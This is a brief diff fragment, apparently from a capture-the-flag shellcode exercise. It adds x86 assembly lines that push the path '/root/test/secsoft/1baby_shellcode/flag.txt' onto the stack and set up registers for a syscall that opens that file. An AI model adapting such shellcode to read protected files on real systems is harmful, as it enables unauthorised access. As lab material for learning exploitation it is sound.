@@ -1,3 +1,15 @@
+push 0'
+push %d' % u32('.txt')
+push %d' % u32('flag')
+push %d' % u32('ode/')
+push %d' % u32('ellc')
+push %d' % u32('y_sh')
+push %d' % u32('1bab')
+push %d' % u32('ft/1')
+push %d' % u32('ecso')
+push %d' % u32('st/s')
+push %d' % u32('t/te')
+push %d' % u32('/roo')
 mov edx, 0
 mov ecx, 0
 mov ebx, esp
